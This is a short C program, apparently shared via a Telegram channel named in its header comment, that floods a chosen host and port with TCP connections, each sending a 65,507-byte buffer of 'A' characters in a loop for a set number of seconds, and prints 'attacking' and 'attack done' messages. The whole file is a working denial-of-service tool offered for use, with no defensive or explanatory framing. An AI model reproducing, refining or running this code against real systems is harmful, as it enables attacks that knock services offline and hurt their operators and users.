/*
	t.me/httpplain
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>

void launch(const char *host, int port) {
    int sockfd;
    struct sockaddr_in dest;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("Socket creation failed");
        exit(1);
    }
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &dest.sin_addr) <= 0) {
        perror("Invalid address");
        close(sockfd);
        exit(1);
    }
    if (connect(sockfd, (struct sockaddr *)&dest, sizeof(dest)) == -1) {
        perror("Connection failed");
        close(sockfd);
        exit(1);
    }
    char packet[65507];
    memset(packet, 'A', sizeof(packet));
    if (send(sockfd, packet, sizeof(packet), 0) == -1) {
        perror("Packet sending failed");
    }
    close(sockfd);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <host> <port> <time>\n", argv[0]);
        return 1;
    }
    const char *host = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    printf("attacking %s:%d for %d seconds...\n", host, port, duration);
    time_t endTime = time(NULL) + duration;
    while (time(NULL) < endTime) {
        launch(host, port);
    }
    printf("attack done.\n");
    return 0;
}